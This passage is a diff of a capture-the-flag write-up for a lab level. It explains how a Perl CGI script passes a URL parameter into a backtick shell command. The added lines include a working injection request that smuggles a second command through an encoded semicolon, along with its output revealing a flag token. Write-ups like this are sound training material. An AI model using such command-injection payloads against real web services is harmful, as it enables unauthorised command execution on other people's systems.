@@ -2,14 +2,18 @@
 
 ## 💡 Explanation
 
-In this level we have to:
-1. We check the permissions of the file level04: it belongs to the user flag04 and gives permissions to execute as user (as lvl 03).
-2. We can see that the script calls to the function `x` and pass as an argument the parameter `x`.
-3. Then the script takes the argument as the variable `y`.
-4. The y variable is inserted in the string `echo $y 2>&1`
-5. The string is excecuted by bash (backticks in perl do this)
-4. We can use the variable to pass the command `getflag` so it will execute when doing the echo.
+ * This file execute itself when doing `curl localhost:4747/level04.pl/`
+ * And if the url has a query with a parameter 'x' it will print it.
+ * As the text is between backticks and is a shell command we can use it at our advantage
+ * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
+ * The last thing to do will be to encrypt spaces and & characters for urls
+ * `curl localhost:4747/level04.pl/?x=yoo%3Bgetflag`
 
+```bash
+curl localhost:4747/level04.pl/?x=yoo%3Bgetflag
+yoo
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
 
 `level04.pl`
 ```perl
